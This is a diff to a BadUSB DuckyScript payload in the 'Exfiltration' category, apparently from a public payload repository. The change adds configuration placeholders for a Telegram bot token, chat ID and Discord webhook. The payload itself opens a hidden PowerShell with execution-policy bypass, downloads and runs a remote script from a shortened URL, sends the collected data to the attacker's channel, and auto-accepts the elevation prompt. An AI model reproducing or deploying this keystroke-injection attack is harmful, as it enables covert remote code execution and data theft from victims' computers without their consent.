@@ -6,12 +6,21 @@ REM Version:	1.0
 REM Category:	Exfiltration
 REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
+REM If you want to use discord webhook instead of telegram bot, just change DC_WEBHOOK 
+
+REM Telegram bot details
+DEFINE BOT_TOKEN your-bot-token
+DEFINE CHAT_ID your-chat-id
+
+REM Discord webhook
+DEFINE DC_WEBHOOK your-webhook
+
 DELAY 1500
 GUI r
 DELAY 500
 REM If you want to use Telegram change just bot token and chat id
 REM If you want to use Discord Webhook dont do anything with botToken and chatID just change $webhook
-STRING powershell -w h -NoP -Ep Bypass -Command $botToken='bot_token'; $chatID='chat_id'; $webhook='dc_webhook'; irm https://t.ly/pPFpN | iex
+STRING powershell -w h -NoP -Ep Bypass -Command $botToken='BOT_TOKEN'; $chatID='CHAT_ID'; $webhook='DC_WEBHOOK'; irm https://t.ly/pPFpN | iex
 CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
